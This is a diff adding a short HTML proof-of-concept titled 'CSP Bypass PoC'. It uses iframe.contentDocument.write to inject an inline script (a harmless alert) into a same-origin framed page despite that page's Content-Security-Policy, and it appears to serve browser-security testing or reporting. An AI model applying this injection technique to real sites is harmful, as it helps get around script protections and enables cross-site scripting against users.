@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CSP Bypass PoC</title>
+    <!-- Parent CSP allows inline scripts -->
+    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+</head>
+<body>
+    <h1>CSP Bypass via iframe.contentDocument.write</h1>
+    <iframe id="x" src="self.html"></iframe>
+
+    <script nonce="123">
+        // Wait for iframe to load
+        const iframe = document.getElementById('x');
+        iframe.onload = () => {
+            // Inject script into iframe regardless of its own CSP
+            iframe.contentDocument.write('<script>alert("CSP bypassed!");<\/script>');
+        };
+    </script>
+</body>
+</html>
